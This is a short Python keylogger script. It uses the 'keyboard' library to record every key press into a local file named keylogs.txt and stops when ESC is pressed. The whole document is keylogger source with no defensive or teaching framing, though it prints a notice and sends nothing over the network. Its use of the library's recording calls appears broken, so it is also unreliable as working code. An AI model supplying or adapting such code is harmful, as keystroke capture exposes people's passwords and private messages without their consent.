import keyboard as kb

def on_key_event(event):
    with open('keylogs.txt', 'a') as f: # Open file for writing, append mode to retain previous data
        if event.event_type == kb.KEY_DOWN: # Only handle key down events 
            name = event.name
  
          # Format special keys correctly and write them to the file 
            if len(name) > 1:
                f.write('[' + name.upper() + ']') 
            else:
               f.write(str(event.name)) 
        elif event.event_type == kb.KEY_UP and event.scan_code == 1: # Handle ESC key to exit the program  
            kb.stop_recording()
           
def main():   
    try: 
        print("Recording your keyboard data. Press ESC to stop.")# Start recording events
        kb.start_recording(on_key_event)
        kb.wait('esc') # Block execution until ESC key is pressed
          
    except Exception as e: 
        print('Exception Occurred: ' + str(e))  # Print exception for debugging purposes if any occurs during the program execution 
  
if __name__ == "__main__":  
    main()  
